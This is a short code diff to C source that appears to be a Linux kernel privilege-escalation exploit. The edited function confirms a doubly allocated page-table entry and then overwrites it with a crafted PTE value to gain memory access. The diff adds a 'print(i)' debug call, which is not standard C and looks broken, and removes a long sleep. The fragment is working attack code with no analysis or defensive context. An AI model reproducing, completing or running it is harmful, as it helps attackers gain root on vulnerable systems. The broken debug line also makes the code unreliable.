@@ -362,6 +362,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
 		{
+			print(i);
 			printf("[+] confirmed double alloc PMD/PTE\n");
 			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
 			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
@@ -375,7 +376,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 		return;
 	}
-	sleep(9999);
+
 	// set new pte value for sanity check
 	*pte_area = 0x0 | 0x8000000000000867;
 
